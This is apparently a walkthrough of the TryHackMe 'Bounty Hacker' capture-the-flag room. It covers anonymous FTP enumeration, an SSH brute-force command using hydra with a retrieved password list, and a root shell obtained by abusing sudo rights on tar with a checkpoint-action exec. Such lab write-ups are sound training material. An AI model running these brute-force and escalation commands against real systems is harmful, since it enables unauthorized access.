# 🕵️‍♂️ Bounty Hacker CTF Walkthrough  
*TryHackMe Room: Bounty Hacker*  
*Difficulty: Easy*  
*Date: 2025-07-19*

---

## 🎯 Objective  
Capture the **user** and **root** flags.

---

## 🛠️ Enumeration

### 🔍 Nmap Scan

```

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3 (anonymous login allowed)
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache 2.4.18 (Ubuntu)

````

---

## 📂 FTP Access

- Connected with **anonymous** FTP.
- Timeout on listing, but guessed filenames.
- Downloaded:

  - `locks.txt` → password list
  - `task.txt` → mentions user `lin` and a password hint

---

## 🔑 SSH Brute Force

Used `hydra` to brute-force SSH for user `lin`:

```bash
hydra -l lin -P locks.txt ssh://bountyhacker.thm
````

→ **Success** with credentials (redacted)

---

## 💻 User Access

```bash
ssh lin@bountyhacker.thm
# password: <REDACTED>
```

✅ Logged in as `lin`.

```bash
cat user.txt
# → <REDACTED>
```

---

## 🚀 Privilege Escalation

### 🔍 Check sudo access

```bash
sudo -l
# (root) /bin/tar
```

User `lin` can run `tar` as root.

### 📈 Exploit via GTFOBins

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

✅ Got root shell!

```bash
whoami
# → root

cat /root/root.txt
# → <REDACTED>
```

---

## 📚 Lessons Learned

* Anonymous FTP might hide files—guessing and brute-force helps.
* Pay attention to any password-related files (`locks.txt`).
* `sudo -l` is key to finding privilege escalation vectors.
* GTFOBins provides reliable privesc tactics—like abusing `tar`.

---

## 🏷️ Tags

`tryhackme` `ctf` `bountyhacker` `ftp` `ssh` `gtfobins` `linux` `beginner` `privesc`

```

